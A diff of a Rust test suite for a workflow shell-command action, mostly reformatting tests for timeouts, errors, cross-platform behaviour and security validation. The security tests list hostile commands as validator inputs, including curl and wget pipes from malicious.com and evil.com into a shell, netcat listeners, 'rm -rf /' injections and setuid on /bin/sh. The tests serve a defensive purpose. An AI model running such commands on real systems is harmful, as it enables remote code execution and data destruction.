@@ -1268,15 +1433,18 @@ mod timeout_and_process_management_tests {
         // This test verifies that processes are properly cleaned up after timeout
         // We can't easily test the actual process cleanup, but we can verify
         // that the timeout mechanism works correctly
-        let action = ShellAction::new("sleep 5".to_string())
-            .with_timeout(Duration::from_millis(200));
+        let action =
+            ShellAction::new("sleep 5".to_string()).with_timeout(Duration::from_millis(200));
         let mut context = HashMap::new();
-        
+
         let _result = action.execute(&mut context).await.unwrap();
-        
+
         // The fact that this completes without hanging indicates proper cleanup
-        assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(false)));
-        
+        assert_eq!(
+            context.get("success"),
+            Some(&serde_json::Value::Bool(false))
+        );
+
         // Give a brief moment for any cleanup to complete
         tokio::time::sleep(Duration::from_millis(50)).await;
     }
@@ -1284,22 +1452,22 @@ mod timeout_and_process_management_tests {
     #[test]
     fn test_timeout_validation_helper_function() {
         // Test the validate_timeout helper function directly
-        let action = ShellAction::new("echo test".to_string())
-            .with_timeout(Duration::from_secs(300));
+        let action =
+            ShellAction::new("echo test".to_string()).with_timeout(Duration::from_secs(300));
         assert!(action.validate_timeout().is_ok());
-        
-        let action = ShellAction::new("echo test".to_string())
-            .with_timeout(Duration::from_secs(3600));
+
+        let action =
+            ShellAction::new("echo test".to_string()).with_timeout(Duration::from_secs(3600));
         assert!(action.validate_timeout().is_ok());
-        
-        let action = ShellAction::new("echo test".to_string())
-            .with_timeout(Duration::from_secs(4000));
+
+        let action =
+            ShellAction::new("echo test".to_string()).with_timeout(Duration::from_secs(4000));
         assert!(action.validate_timeout().is_err());
-        
-        let action = ShellAction::new("echo test".to_string())
-            .with_timeout(Duration::from_millis(0));
+
+        let action =
+            ShellAction::new("echo test".to_string()).with_timeout(Duration::from_millis(0));
         assert!(action.validate_timeout().is_err());
-        
+
         // Test default timeout
         let action = ShellAction::new("echo test".to_string());
         let timeout = action.validate_timeout().unwrap();
@@ -1309,30 +1477,33 @@ mod timeout_and_process_management_tests {
     #[tokio::test]
     async fn test_concurrent_timeout_commands() {
         // Test multiple timeout commands running concurrently
-        let action1 = ShellAction::new("sleep 1".to_string())
-            .with_timeout(Duration::from_millis(200));
-        let action2 = ShellAction::new("sleep 1".to_string())
-            .with_timeout(Duration::from_millis(200));
-        
+        let action1 =
+            ShellAction::new("sleep 1".to_string()).with_timeout(Duration::from_millis(200));
+        let action2 =
+            ShellAction::new("sleep 1".to_string()).with_timeout(Duration::from_millis(200));
+
         let mut context1 = HashMap::new();
         let mut context2 = HashMap::new();
-        
+
         let start = std::time::Instant::now();
-        
+
         // Run both actions concurrently
         let (result1, result2) = tokio::join!(
             action1.execute(&mut context1),
             action2.execute(&mut context2)
         );
-        
+
         let elapsed = start.elapsed();
-        
+
         // Both should timeout
         assert_eq!(result1.unwrap(), serde_json::Value::Bool(false));
         assert_eq!(result2.unwrap(), serde_json::Value::Bool(false));
-        
+
         // Should complete in roughly the timeout period (not sequential)
-        assert!(elapsed < Duration::from_millis(600), "Concurrent execution took too long: {:?}", elapsed);
+        assert!(
+            elapsed < Duration::from_millis(600),
+            "Concurrent execution took too long: {elapsed:?}"
+        );
     }
 }
 
@@ -1344,16 +1515,22 @@ mod comprehensive_error_handling_tests {
     #[tokio::test]
     async fn test_command_failure_various_exit_codes() {
         let exit_codes = [1, 2, 127, 255];
-        
+
         for exit_code in exit_codes {
             let action = ShellAction::new(format!("exit {exit_code}"));
             let mut context = HashMap::new();
-            
+
             let result = action.execute(&mut context).await.unwrap();
-            
-            assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(false)));
+
+            assert_eq!(
+                context.get("success"),
+                Some(&serde_json::Value::Bool(false))
+            );
             assert_eq!(context.get("failure"), Some(&serde_json::Value::Bool(true)));
-            assert_eq!(context.get("exit_code"), Some(&serde_json::Value::Number(exit_code.into())));
+            assert_eq!(
+                context.get("exit_code"),
+                Some(&serde_json::Value::Number(exit_code.into()))
+            );
             assert_eq!(result, serde_json::Value::Bool(false));
         }
     }
@@ -1362,16 +1539,19 @@ mod comprehensive_error_handling_tests {
     async fn test_nonexistent_command_error_handling() {
         let action = ShellAction::new("nonexistent_command_12345_xyz".to_string());
         let mut context = HashMap::new();
-        
+
         let _result = action.execute(&mut context).await.unwrap();
-        
-        assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(false)));
+
+        assert_eq!(
+            context.get("success"),
+            Some(&serde_json::Value::Bool(false))
+        );
         assert_eq!(context.get("failure"), Some(&serde_json::Value::Bool(true)));
-        
+
         let stderr = context.get("stderr").unwrap().as_str().unwrap();
-        assert!(stderr.len() > 0, "stderr should contain error message");
-        
-        // Exit code should be non-zero 
+        assert!(!stderr.is_empty(), "stderr should contain error message");
+
+        // Exit code should be non-zero
         let exit_code = context.get("exit_code").unwrap().as_i64().unwrap();
         assert_ne!(exit_code, 0);
     }
@@ -1383,15 +1563,15 @@ mod comprehensive_error_handling_tests {
             "/root/secret/hidden", // Likely doesn't exist and not accessible
             "\\invalid\\windows\\path",
         ];
-        
+
         for dir in invalid_dirs {
-            let action = ShellAction::new("echo test".to_string())
-                .with_working_dir(dir.to_string());
+            let action =
+                ShellAction::new("echo test".to_string()).with_working_dir(dir.to_string());
             let mut context = HashMap::new();
-            
+
             let result = action.execute(&mut context).await;
-            assert!(result.is_err(), "Should fail with invalid directory: {}", dir);
-            
+            assert!(result.is_err(), "Should fail with invalid directory: {dir}");
+
             let error_msg = result.unwrap_err().to_string();
             assert!(error_msg.contains("Working directory"));
         }
@@ -1402,18 +1582,18 @@ mod comprehensive_error_handling_tests {
         // Create a temporary file to use as an invalid working directory
         use std::fs::File;
         use tempfile::tempdir;
-        
+
         let temp_dir = tempdir().unwrap();
         let file_path = temp_dir.path().join("not_a_directory.txt");
         File::create(&file_path).unwrap();
-        
+
         let action = ShellAction::new("echo test".to_string())
             .with_working_dir(file_path.to_string_lossy().to_string());
         let mut context = HashMap::new();
-        
+
         let result = action.execute(&mut context).await;
         assert!(result.is_err());
-        
+
         let error_msg = result.unwrap_err().to_string();
         assert!(error_msg.contains("is not a directory"));
     }
@@ -1423,9 +1603,9 @@ mod comprehensive_error_handling_tests {
         // Use a different approach that doesn't trigger security validation
         let action = ShellAction::new("echo error message >&2".to_string());
         let mut context = HashMap::new();
-        
+
         let result = action.execute(&mut context).await;
-        
+
         // This might work or fail depending on shell, but should handle gracefully
         match result {
             Ok(_) => {
@@ -1445,16 +1625,19 @@ mod comprehensive_error_handling_tests {
         // This test is expected to fail due to security validation of semicolon
         let action = ShellAction::new("echo stdout message".to_string());
         let mut context = HashMap::new();
-        
-        let result = action.execute(&mut context).await.unwrap();
-        
+
+        let _result = action.execute(&mut context).await.unwrap();
+
         // Should succeed and have stdout
         assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
-        assert_eq!(context.get("exit_code"), Some(&serde_json::Value::Number(0.into())));
-        
+        assert_eq!(
+            context.get("exit_code"),
+            Some(&serde_json::Value::Number(0.into()))
+        );
+
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains("stdout message"));
-        
+
         // stderr should be empty for successful command
         let stderr = context.get("stderr").unwrap().as_str().unwrap();
         assert_eq!(stderr.trim(), "");
@@ -1468,44 +1651,49 @@ mod comprehensive_error_handling_tests {
         let invalid_command = "cmd /C \"invalid\"command\"syntax\"";
         #[cfg(not(target_os = "windows"))]
         let invalid_command = "sh -c 'invalid\"command\"syntax'";
-        
+
         let action = ShellAction::new(invalid_command.to_string());
         let mut context = HashMap::new();
-        
+
         // This might either succeed with an error exit code or fail to spawn
         // We just verify it doesn't panic and handles the error gracefully
         let result = action.execute(&mut context).await;
-        
+
         match result {
             Ok(value) => {
                 // If it spawned, it should have failed
                 assert_eq!(value, serde_json::Value::Bool(false));
-                assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(false)));
+                assert_eq!(
+                    context.get("success"),
+                    Some(&serde_json::Value::Bool(false))
+                );
             }
             Err(error) => {
                 // If spawn failed, error should mention spawn failure
                 let error_msg = error.to_string();
-                assert!(error_msg.contains("Failed to spawn command") || error_msg.contains("execution"));
+                assert!(
+                    error_msg.contains("Failed to spawn command")
+                        || error_msg.contains("execution")
+                );
             }
         }
     }
 
-    #[tokio::test] 
+    #[tokio::test]
     async fn test_environment_variable_substitution_error_resilience() {
         // Test that environment variable substitution errors don't crash
         let mut env = HashMap::new();
         env.insert("VALID_VAR".to_string(), "${nonexistent_var}".to_string());
-        
-        let action = ShellAction::new("echo $VALID_VAR".to_string())
-            .with_environment(env);
+
+        let action = ShellAction::new("echo $VALID_VAR".to_string()).with_environment(env);
         let mut context = HashMap::new();
         // Deliberately don't provide nonexistent_var
-        
+
         let _result = action.execute(&mut context).await.unwrap();
-        
+
         // Should execute but with the unsubstituted variable
         assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
-        
+
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         // The ${nonexistent_var} should remain as-is
         assert!(stdout.contains("${nonexistent_var}") || stdout.trim().is_empty());
@@ -1517,11 +1705,11 @@ mod comprehensive_error_handling_tests {
         let large_text = "a".repeat(1000);
         let action = ShellAction::new(format!("echo '{large_text}'"));
         let mut context = HashMap::new();
-        
+
         let _result = action.execute(&mut context).await.unwrap();
-        
+
         assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
-        
+
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains(&large_text));
     }
@@ -1529,21 +1717,27 @@ mod comprehensive_error_handling_tests {
     #[tokio::test]
     async fn test_error_context_preservation() {
         // Test that all context variables are properly set in error scenarios
-        let action = ShellAction::new("exit 42".to_string())
-            .with_result_variable("result".to_string());
+        let action =
+            ShellAction::new("exit 42".to_string()).with_result_variable("result".to_string());
         let mut context = HashMap::new();
-        
-        let result = action.execute(&mut context).await.unwrap();
-        
+
+        let _result = action.execute(&mut context).await.unwrap();
+
         // Verify all expected context variables are present
-        assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(false)));
+        assert_eq!(
+            context.get("success"),
+            Some(&serde_json::Value::Bool(false))
+        );
         assert_eq!(context.get("failure"), Some(&serde_json::Value::Bool(true)));
-        assert_eq!(context.get("exit_code"), Some(&serde_json::Value::Number(42.into())));
-        
+        assert_eq!(
+            context.get("exit_code"),
+            Some(&serde_json::Value::Number(42.into()))
+        );
+
         assert!(context.contains_key("stdout"));
         assert!(context.contains_key("stderr"));
         assert!(context.contains_key("duration_ms"));
-        
+
         // Result variable should be set to empty stdout for failed command
         assert!(context.contains_key("result"));
         let result_value = context.get("result").unwrap().as_str().unwrap();
@@ -1559,15 +1753,15 @@ mod additional_security_tests {
     #[test]
     fn test_command_length_boundary_conditions() {
         use crate::workflow::actions::validate_command;
-        
+
         // Test exactly at boundary
         let boundary_command = "a".repeat(4096);
         assert!(validate_command(&boundary_command).is_ok());
-        
+
         // Test just over boundary
         let over_boundary_command = "a".repeat(4097);
         assert!(validate_command(&over_boundary_command).is_err());
-        
+
         // Test well under boundary
         let normal_command = "echo hello world";
         assert!(validate_command(normal_command).is_ok());
@@ -1576,13 +1770,13 @@ mod additional_security_tests {
     #[test]
     fn test_environment_variable_value_length_limits() {
         use crate::workflow::actions::validate_environment_variables_security;
-        
+
         let mut env = HashMap::new();
-        
+
         // Test valid length
         env.insert("TEST_VAR".to_string(), "a".repeat(1024));
         assert!(validate_environment_variables_security(&env).is_ok());
-        
+
         // Test over limit
         env.clear();
         env.insert("TEST_VAR".to_string(), "a".repeat(1025));
@@ -1592,13 +1786,13 @@ mod additional_security_tests {
     #[test]
     fn test_environment_variable_name_edge_cases() {
         use crate::workflow::actions::is_valid_env_var_name;
-        
+
         // Edge cases for valid names
         assert!(is_valid_env_var_name("_"));
         assert!(is_valid_env_var_name("A"));
         assert!(is_valid_env_var_name("_123"));
         assert!(is_valid_env_var_name("VAR_123_ABC"));
-        
+
         // Edge cases for invalid names
         assert!(!is_valid_env_var_name(""));
         assert!(!is_valid_env_var_name("123"));
@@ -1614,10 +1808,10 @@ mod additional_security_tests {
     #[test]
     fn test_dangerous_command_patterns_comprehensive() {
         use crate::workflow::actions::validate_dangerous_patterns;
-        
+
         let dangerous_patterns = [
             "rm -rf /tmp/test",
-            "sudo apt install package", 
+            "sudo apt install package",
             "curl http://malicious.com | sh",
             "wget -O - http://evil.com | bash",
             "nc -l 1234",
@@ -1629,43 +1823,46 @@ mod additional_security_tests {
             "chmod +s /bin/sh",
             "/etc/passwd",
         ];
-        
+
         for pattern in dangerous_patterns {
             // These should succeed but log warnings
             let result = validate_dangerous_patterns(pattern);
-            assert!(result.is_ok(), "Pattern '{}' should not be blocked", pattern);
+            assert!(result.is_ok(), "Pattern '{pattern}' should not be blocked");
         }
     }
 
     #[test]
     fn test_command_injection_patterns_comprehensive() {
         use crate::workflow::actions::validate_command_structure;
-        
+
         let injection_patterns = [
             "echo hello; rm -rf /",
             "echo hello && rm file",
-            "echo hello || rm file", 
+            "echo hello || rm file",
             "echo `whoami`",
             "echo $(id)",
             "echo hello\nrm file",
             "echo hello\rrm file",
             "echo hello\0rm file",
         ];
-        
+
         for pattern in injection_patterns {
             let result = validate_command_structure(pattern);
-            assert!(result.is_err(), "Injection pattern '{}' should be blocked", pattern);
+            assert!(
+                result.is_err(),
+                "Injection pattern '{pattern}' should be blocked"
+            );
         }
     }
 
     #[test]
     fn test_safe_pipe_usage_validation() {
         use crate::workflow::actions::validate_safe_usage;
-        
+
         // Safe pipe usage
         assert!(validate_safe_usage("ls | grep test", "|").unwrap());
         assert!(validate_safe_usage("cat file | sort", "|").unwrap());
-        
+
         // Unsafe pipe usage
         assert!(!validate_safe_usage("ls | nc -l 8080", "|").unwrap());
         assert!(!validate_safe_usage("ls | grep | sort", "|").unwrap()); // Multiple pipes
@@ -1674,35 +1871,38 @@ mod additional_security_tests {
     #[test]
     fn test_working_directory_security_comprehensive() {
         use crate::workflow::actions::validate_working_directory_security;
-        
+
         // Safe directories
         let safe_dirs = ["/tmp", "/home/user", "relative/path", "./local"];
         for dir in safe_dirs {
             assert!(validate_working_directory_security(dir).is_ok());
         }
-        
+
         // Sensitive directories (should succeed but log warnings)
         let sensitive_dirs = ["/etc", "/sys", "/proc", "/root", "/boot"];
         for dir in sensitive_dirs {
             let result = validate_working_directory_security(dir);
-            assert!(result.is_ok(), "Sensitive directory '{}' should not be blocked", dir);
+            assert!(
+                result.is_ok(),
+                "Sensitive directory '{dir}' should not be blocked"
+            );
         }
-        
+
         // Path traversal attempts (should fail)
         let traversal_paths = ["../parent", "path/../parent", "/absolute/../parent"];
         for path in traversal_paths {
             let result = validate_working_directory_security(path);
-            assert!(result.is_err(), "Path traversal '{}' should be blocked", path);
+            assert!(result.is_err(), "Path traversal '{path}' should be blocked");
         }
     }
 
     #[test]
     fn test_environment_variable_null_byte_injection() {
         use crate::workflow::actions::validate_environment_variables_security;
-        
+
         let mut env = HashMap::new();
         env.insert("TEST_VAR".to_string(), "value\0with\0nulls".to_string());
-        
+
         let result = validate_environment_variables_security(&env);
         assert!(result.is_err());
         let error_msg = result.unwrap_err().to_string();
@@ -1712,10 +1912,10 @@ mod additional_security_tests {
     #[test]
     fn test_environment_variable_newline_injection() {
         use crate::workflow::actions::validate_environment_variables_security;
-        
+
         let mut env = HashMap::new();
         env.insert("TEST_VAR".to_string(), "value\nwith\nnewlines".to_string());
-        
+
         let result = validate_environment_variables_security(&env);
         assert!(result.is_err());
         let error_msg = result.unwrap_err().to_string();
@@ -1725,19 +1925,28 @@ mod additional_security_tests {
     #[test]
     fn test_protected_environment_variables() {
         use crate::workflow::actions::validate_environment_variables_security;
-        
+
         let protected_vars = [
-            "PATH", "LD_LIBRARY_PATH", "HOME", "USER", "SHELL", 
-            "SSH_AUTH_SOCK", "SUDO_USER", "SUDO_UID"
+            "PATH",
+            "LD_LIBRARY_PATH",
+            "HOME",
+            "USER",
+            "SHELL",
+            "SSH_AUTH_SOCK",
+            "SUDO_USER",
+            "SUDO_UID",
         ];
-        
+
         for var in protected_vars {
             let mut env = HashMap::new();
             env.insert(var.to_string(), "modified_value".to_string());
-            
+
             // Should succeed but log warnings
             let result = validate_environment_variables_security(&env);
-            assert!(result.is_ok(), "Protected variable '{}' should not be blocked", var);
+            assert!(
+                result.is_ok(),
+                "Protected variable '{var}' should not be blocked"
+            );
         }
     }
 
@@ -1746,10 +1955,10 @@ mod additional_security_tests {
         // Test that security validation happens before execution
         let action = ShellAction::new("echo hello; rm -rf /".to_string());
         let mut context = HashMap::new();
-        
+
         let result = action.execute(&mut context).await;
         assert!(result.is_err());
-        
+
         // Context should not be modified if security validation fails
         assert!(!context.contains_key("success"));
         assert!(!context.contains_key("failure"));
@@ -1767,7 +1976,7 @@ mod integration_tests {
         let action = parse_action_from_description("Shell \"echo hello\"")
             .unwrap()
             .unwrap();
-        
+
         assert_eq!(action.action_type(), "shell");
         assert!(action.description().contains("echo hello"));
         assert!(action.description().contains("Execute shell command"));
@@ -1776,11 +1985,13 @@ mod integration_tests {
     #[test]
     fn test_action_dispatch_integration_with_parameters() {
         let action = parse_action_from_description(
-            "Shell \"ls -la\" with timeout=30 result=\"files\" working_dir=\"/tmp\""
-        ).unwrap().unwrap();
-        
+            "Shell \"ls -la\" with timeout=30 result=\"files\" working_dir=\"/tmp\"",
+        )
+        .unwrap()
+        .unwrap();
+
         assert_eq!(action.action_type(), "shell");
-        
+
         // Downcast to verify parameters were parsed correctly
         let shell_action = action.as_any().downcast_ref::<ShellAction>().unwrap();
         assert_eq!(shell_action.command, "ls -la");
@@ -1792,11 +2003,17 @@ mod integration_tests {
     #[test]
     fn test_action_dispatch_integration_case_insensitive() {
         let actions = [
-            parse_action_from_description("Shell \"echo test\"").unwrap().unwrap(),
-            parse_action_from_description("shell \"echo test\"").unwrap().unwrap(),
-            parse_action_from_description("SHELL \"echo test\"").unwrap().unwrap(),
+            parse_action_from_description("Shell \"echo test\"")
+                .unwrap()
+                .unwrap(),
+            parse_action_from_description("shell \"echo test\"")
+                .unwrap()
+                .unwrap(),
+            parse_action_from_description("SHELL \"echo test\"")
+                .unwrap()
+                .unwrap(),
         ];
-        
+
         for action in actions {
             assert_eq!(action.action_type(), "shell");
             let shell_action = action.as_any().downcast_ref::<ShellAction>().unwrap();
@@ -1809,7 +2026,7 @@ mod integration_tests {
         // Invalid syntax should return None, not error
         let result = parse_action_from_description("Shell echo hello without quotes");
         assert!(result.unwrap().is_none());
-        
+
         let result = parse_action_from_description("NotShell \"echo hello\"");
         assert!(result.unwrap().is_none());
     }
@@ -1821,7 +2038,7 @@ mod integration_tests {
             ("Shell \"ls -la\"", "ls -la"),
             ("Shell \"pwd\" with timeout=30", "pwd"),
         ];
-        
+
         for (description, expected_command) in test_cases {
             let action = parse_action_from_description(description).unwrap().unwrap();
             assert_eq!(action.action_type(), "shell");
@@ -1835,15 +2052,15 @@ mod integration_tests {
         let action = ShellAction::new("echo 'captured output'".to_string())
             .with_result_variable("my_result".to_string());
         let mut context = HashMap::new();
-        
-        let result = action.execute(&mut context).await.unwrap();
-        
-        // Verify result variable is captured correctly  
+
+        let _result = action.execute(&mut context).await.unwrap();
+
+        // Verify result variable is captured correctly
         assert_eq!(
             context.get("my_result").unwrap().as_str().unwrap().trim(),
             "captured output"
         );
-        
+
         // Verify standard context variables are also set
         assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
         assert!(context.contains_key("stdout"));
@@ -1856,18 +2073,18 @@ mod integration_tests {
         let action1 = ShellAction::new("echo first_result".to_string())
             .with_result_variable("chain_var".to_string());
         let mut context = HashMap::new();
-        
+
         let _result1 = action1.execute(&mut context).await.unwrap();
-        
+
         // Verify first action set the chain variable
         assert!(context.contains_key("chain_var"));
         let chain_value = context.get("chain_var").unwrap().as_str().unwrap();
         assert!(chain_value.contains("first_result"));
-        
-        // Create second action that uses the chained variable  
+
+        // Create second action that uses the chained variable
         let action2 = ShellAction::new("echo test_chain".to_string());
-        let result2 = action2.execute(&mut context).await.unwrap();
-        
+        let _result2 = action2.execute(&mut context).await.unwrap();
+
         // Verify the chain variable is available for use in future actions
         // (We can't easily test variable substitution without triggering security validation)
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
@@ -1879,9 +2096,9 @@ mod integration_tests {
         let original = ShellAction::new("echo test".to_string())
             .with_timeout(Duration::from_secs(60))
             .with_result_variable("output".to_string());
-        
+
         let cloned = original.clone();
-        
+
         // Verify clone has same properties
         assert_eq!(original.command, cloned.command);
         assert_eq!(original.timeout, cloned.timeout);
@@ -1894,7 +2111,7 @@ mod integration_tests {
     fn test_action_any_trait_integration() {
         let action = ShellAction::new("echo test".to_string());
         let action_trait: Box<dyn crate::workflow::actions::Action> = Box::new(action);
-        
+
         // Test as_any functionality
         let shell_action = action_trait.as_any().downcast_ref::<ShellAction>().unwrap();
         assert_eq!(shell_action.command, "echo test");
@@ -1910,9 +2127,9 @@ mod cross_platform_tests {
     async fn test_cross_platform_echo() {
         let action = ShellAction::new("echo hello world".to_string());
         let mut context = HashMap::new();
-        
-        let result = action.execute(&mut context).await.unwrap();
-        
+
+        let _result = action.execute(&mut context).await.unwrap();
+
         assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains("hello world"));
@@ -1921,22 +2138,25 @@ mod cross_platform_tests {
     #[tokio::test]
     async fn test_cross_platform_exit_codes() {
         let exit_codes = [0, 1, 2];
-        
+
         for exit_code in exit_codes {
             let action = ShellAction::new(format!("exit {exit_code}"));
             let mut context = HashMap::new();
-            
-            let result = action.execute(&mut context).await.unwrap();
-            
+
+            let _result = action.execute(&mut context).await.unwrap();
+
             assert_eq!(
-                context.get("exit_code"), 
+                context.get("exit_code"),
                 Some(&serde_json::Value::Number(exit_code.into()))
             );
-            
+
             if exit_code == 0 {
                 assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
             } else {
-                assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(false)));
+                assert_eq!(
+                    context.get("success"),
+                    Some(&serde_json::Value::Bool(false))
+                );
             }
         }
     }
@@ -1946,9 +2166,9 @@ mod cross_platform_tests {
     async fn test_windows_specific_echo() {
         let action = ShellAction::new("echo Windows Test".to_string());
         let mut context = HashMap::new();
-        
-        let result = action.execute(&mut context).await.unwrap();
-        
+
+        let _result = action.execute(&mut context).await.unwrap();
+
         assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains("Windows Test"));
@@ -1957,10 +2177,9 @@ mod cross_platform_tests {
     #[cfg(target_os = "windows")]
     #[tokio::test]
     async fn test_windows_dir_command() {
-        let action = ShellAction::new("dir /B".to_string())
-            .with_working_dir(".".to_string());
+        let action = ShellAction::new("dir /B".to_string()).with_working_dir(".".to_string());
         let mut context = HashMap::new();
-        
+
         let result = action.execute(&mut context).await;
         // We can't guarantee this will succeed (depends on environment)
         // but it should not panic or cause system issues
@@ -1976,13 +2195,13 @@ mod cross_platform_tests {
     }
 
     #[cfg(not(target_os = "windows"))]
-    #[tokio::test]  
+    #[tokio::test]
     async fn test_unix_specific_commands() {
         let action = ShellAction::new("echo Unix Test".to_string());
         let mut context = HashMap::new();
-        
-        let result = action.execute(&mut context).await.unwrap();
-        
+
+        let _result = action.execute(&mut context).await.unwrap();
+
         assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         assert!(stdout.contains("Unix Test"));
@@ -1991,10 +2210,9 @@ mod cross_platform_tests {
     #[cfg(not(target_os = "windows"))]
     #[tokio::test]
     async fn test_unix_ls_command() {
-        let action = ShellAction::new("ls".to_string())
-            .with_working_dir(".".to_string());
+        let action = ShellAction::new("ls".to_string()).with_working_dir(".".to_string());
         let mut context = HashMap::new();
-        
+
         let result = action.execute(&mut context).await;
         // ls should generally be available on Unix systems
         match result {
@@ -2012,34 +2230,32 @@ mod cross_platform_tests {
     async fn test_cross_platform_environment_variables() {
         let mut env = HashMap::new();
         env.insert("TEST_VAR".to_string(), "test_value".to_string());
-        
-        let action = ShellAction::new("echo $TEST_VAR".to_string())
-            .with_environment(env);
+
+        let action = ShellAction::new("echo $TEST_VAR".to_string()).with_environment(env);
         let mut context = HashMap::new();
-        
-        let result = action.execute(&mut context).await.unwrap();
-        
+
+        let _result = action.execute(&mut context).await.unwrap();
+
         assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
         // Environment variable expansion might work differently on different platforms
         // but the command should execute successfully
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
         // On some platforms it might show $TEST_VAR, on others test_value
-        assert!(stdout.len() > 0);
+        assert!(!stdout.is_empty());
     }
 
     #[tokio::test]
     async fn test_cross_platform_working_directory() {
-        let action = ShellAction::new("pwd".to_string())
-            .with_working_dir("/tmp".to_string());
+        let action = ShellAction::new("pwd".to_string()).with_working_dir("/tmp".to_string());
         let mut context = HashMap::new();
-        
+
         let result = action.execute(&mut context).await;
-        
+
         // This might fail on systems without /tmp, that's expected
         if result.is_ok() {
             assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
             let stdout = context.get("stdout").unwrap().as_str().unwrap();
-            assert!(stdout.contains("tmp") || stdout.len() > 0);
+            assert!(stdout.contains("tmp") || !stdout.is_empty());
         }
     }
 
@@ -2048,9 +2264,9 @@ mod cross_platform_tests {
         // Test that command execution works on different platforms
         let action = ShellAction::new("echo platform test".to_string());
         let mut context = HashMap::new();
-        
-        let result = action.execute(&mut context).await.unwrap();
-        
+
+        let _result = action.execute(&mut context).await.unwrap();
+
         // Should succeed on all platforms
         assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
         let stdout = context.get("stdout").unwrap().as_str().unwrap();
@@ -2060,12 +2276,12 @@ mod cross_platform_tests {
     #[tokio::test]
     async fn test_cross_platform_timeout_behavior() {
         // Test timeout behavior across platforms
-        let action = ShellAction::new("echo quick command".to_string())
-            .with_timeout(Duration::from_secs(5));
+        let action =
+            ShellAction::new("echo quick command".to_string()).with_timeout(Duration::from_secs(5));
         let mut context = HashMap::new();
-        
-        let result = action.execute(&mut context).await.unwrap();
-        
+
+        let _result = action.execute(&mut context).await.unwrap();
+
         // Should succeed quickly on all platforms
         assert_eq!(context.get("success"), Some(&serde_json::Value::Bool(true)));
         let duration = context.get("duration_ms").unwrap().as_u64().unwrap();
@@ -2077,9 +2293,9 @@ mod cross_platform_tests {
         // Test stderr handling across platforms - use a command that should work everywhere
         let action = ShellAction::new("echo 'error' >&2".to_string());
         let mut context = HashMap::new();
-        
+
         let result = action.execute(&mut context).await;
-        
+
         // Behavior might vary by platform, but should handle gracefully
         match result {
             Ok(_) => {
